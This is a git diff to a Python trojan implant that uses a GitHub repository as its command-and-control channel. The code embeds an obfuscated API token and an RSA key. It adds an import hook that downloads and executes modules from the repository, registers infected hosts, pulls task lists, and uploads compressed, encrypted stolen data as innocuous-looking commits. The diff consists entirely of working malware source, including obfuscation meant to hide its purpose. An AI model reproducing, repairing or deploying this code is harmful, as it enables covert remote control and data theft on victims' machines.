@@ -22,7 +22,7 @@ class Config:
 		self.repo = "wendigo_test" #name of repo
 		self.usr = "daniellohrey" #username of repo owner
 		#token to use git api
-		self.token = "MmZmOjDEODZ4iZDBhZjc2ZTVhNDo5ZGZlZDYwO3TQ0NTVNDI2ODYxNA=="
+		self.token = "NWYyOWM0ZjM0NzUwM2E1MDg4YTk1OGNlMTEwMjdhZjFkMzRlYTA5MA=="
 		#public key to encrypt data
 		self.pk = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAndOV4VLdGZgIk+YcW7Kl\nVwiBiesJq6upfiRBo2hM5CEzQiSeBa1/A4h5ozSgQtSgKURVmlDChTNrs0P4bwvi\npCvq8B5SdBw4gcc7YTy03Hl11wfbIPCwqA9JwUl6ZzQtEbw7BAfndry44+2QmAoL\nU2uOoyW2C4MjmUG6SDmNfAL/PsMCvL4fiBJh2V2EUWtCPEqkVIGUHERFFaJwFea3\nFdIqIFVV4SzU6c73wdRFWKHie5WZ4GXQ3GaIAe2cyCMp3UavOhpk4s+N5xdG1xXs\n2AvfXuotYRVxvmSz+L0QiyTXNn0gmphLrMph3jyY/+KX4TH0wIxEx1ZK1gYO8D1V\npQIDAQAB\n-----END PUBLIC KEY-----"
 		self.pwd = "zippass" #password on zipped files
@@ -31,8 +31,8 @@ class Config:
 		self.id_s = "id_seed" #seed to generate ids
 		self.size = 256 #block size of cipher
 		self.tasks = Queue.Queue() #task queue
-		self.id = self.u_id() #generate a new id on start
-		self.pk = self.u_pk(self.pk) #import public key into cipher object
+		self.u_id() #generate a new id on start
+		self.u_pk(self.pk) #import public key into cipher object
 
 	#generates a new id by hashing time and seed (only half of id process)
 	def u_id(self):
@@ -41,12 +41,12 @@ class Config:
 		self.id = str(xxhash.xxh64(t_id).hexdigest())
 
 	#returns our current id by hashing what we already generated
-	#(so id isnt sitting in memory)
-	def id(self):
+	#just use fixstr instead of hashing
+	def g_id(self):
 		return str(xxhash.xxh64(str(self.id)).hexdigest())
 
 	#return deobfuscated module path
-	def mod(self):
+	def g_mod(self):
 		return self.fixstr(self.mod)
 
 	#obfuscates and stores new module path
@@ -55,8 +55,8 @@ class Config:
 		return
 
 	#returns deobfuscated config file path
-	def config(self):
-		return self.fixstr(self.config) + self.id()
+	def g_config(self):
+		return self.fixstr(self.config) + self.g_id()
 
 	#sets new obfuscated config file path
 	def u_config(self, new):
@@ -64,7 +64,7 @@ class Config:
 		return
 
 	#returns deobfuscated data path to new data file
-	def data(self):
+	def g_data(self):
 		return self.fixstr(self.data) + self.id() + "/" + self.nfn()
 
 	#sets new obfuscated data path
@@ -73,7 +73,7 @@ class Config:
 		return
 
 	#returns deobfuscated username
-	def usr(self):
+	def g_usr(self):
 		return self.fixstr(self.usr)
 
 	#sets new obfuscated username
@@ -82,7 +82,7 @@ class Config:
 		return
 
 	#returns deobfuscated token
-	def token(self):
+	def g_token(self):
 		return base64.b64decode(self.fixstr(self.token))
 
 	#sets new obfuscated token
@@ -91,7 +91,7 @@ class Config:
 		return
 
 	#returns deobfuscated repo name
-	def repo(self):
+	def g_repo(self):
 		return self.fixstr(self.repo)
 
 	#sets new obfuscated repo name
@@ -103,11 +103,11 @@ class Config:
 	def u_pk(self, new):
 		self.pk = new
 		self.pk = RSA.importKey(self.pk)
-		self.PKCS1_OAEP.new(self.pk)
+		self.pk = PKCS1_OAEP.new(self.pk)
 		return
 
 	#returns deobfuscated zip password
-	def pwd(self):
+	def g_pwd(self):
 		return self.fixstr(self.pwd)
 
 	#sets new obfuscated zip password
@@ -116,13 +116,13 @@ class Config:
 		return
 
 	#generates a random filename for a data file
-	def fn(self):
+	def g_fn(self):
 		i_time = int(time.time())
 		fn = str(i_time) + self.fixstr(self.fn_s)
 		return xxhash.xxh64(fn).hexdigest()
 
 	#generates a random commit message for creating/updating files
-	def com(self):
+	def g_com(self):
 		com = str(time.time())
 		return xxhash.xxh64(com).hexdigest()
 
@@ -140,7 +140,7 @@ class ReImp(object):
 		self.code = ""
 
 	def find_module(self, fullname, path=None): #get file from github
-		lib = get_file(config.mod() + fullname)
+		lib = get_file(config.g_mod() + fullname)
 		if lib is not None:
 			self.code = lib
 			return self
@@ -154,8 +154,8 @@ class ReImp(object):
 
 #connects to github and return repo object
 def connect():
-	gh = login(token = config.token())
-	repo = gh.repository(config.usr(), config.repo())
+	gh = login(token = config.g_token())
+	repo = gh.repository(config.g_usr(), config.g_repo())
 	return repo
 
 #downloads file from github and decrypts it
@@ -170,14 +170,15 @@ def get_file(path):
 def create_config():
 	try:
 		repo = connect()
-		repo.create_file(config.config(), config.com(), config.com())
+		repo.create_file(config.g_config(), config.g_com(), config.g_com())
 		return 1
 	except:
+		#make global exception string
 		return 0
 
 #gets config file, imports unimported modules and returns a dictionary of tasks
 def get_config():
-	c_json = get_file(config.config())
+	c_json = get_file(config.g_config())
 	try:
 		c_dict = json.loads(c_json)
 		for mod in c_dict:
@@ -191,7 +192,7 @@ def get_config():
 def clear_config():
 	try:
 		repo = connect()
-		repo.file_contents(config.config()).update(config.com(), config.com())
+		repo.file_contents(config.g_config()).update(config.g_com(), config.g_com())
 		return 1
 	except:
 		return 0
@@ -200,7 +201,7 @@ def clear_config():
 def push_data(data):
 	try:
 		repo = connect()
-		repo.create_file(config.data(), config.com(), encrypt(data))
+		repo.create_file(config.g_data(), config.g_com(), encrypt(data))
 		return 1
 	except:
 		return 0
@@ -215,8 +216,8 @@ def decrypt(data):
 
 #encrypts data before pushing it to github
 def encrypt(data):
-	key = config.my_pk()
-	size = config.my_size()
+	key = config.g_pk()
+	size = config.size
 	offset = 0
 	encrypted = ""
 	compressed = zlib.compress(data)
@@ -245,18 +246,21 @@ def module_runner():
 		task = config.tasks.get()
 		t = threading.Thread(target=run_module, kwargs = task)
 		t.start()
-		time.sleep(task['sleep']) #obfuscate strings
+		try:
+			time.sleep(task['sleep']) #obfuscate strings
+		except:
+			pass
 	return
 
 #main
-config = Config.Config() #create config object
+config = Config() #create config object
 sys.meta_path = [ReImp()] #add remote import to the import path
 create_config() #create a blank config file to register
 while True:
 	if config.tasks.empty(): #get config file when all tasks have been finished
 		config_file = get_config()
 		if config_file == None:
-			time.sleep(config.my_sleep()) #sleep if there are no new tasks
+			time.sleep(config.sleep) #sleep if there are no new tasks
 			continue
 		for task in config_file:
 			config.tasks.put(task) #if there are tasks add them to the queue
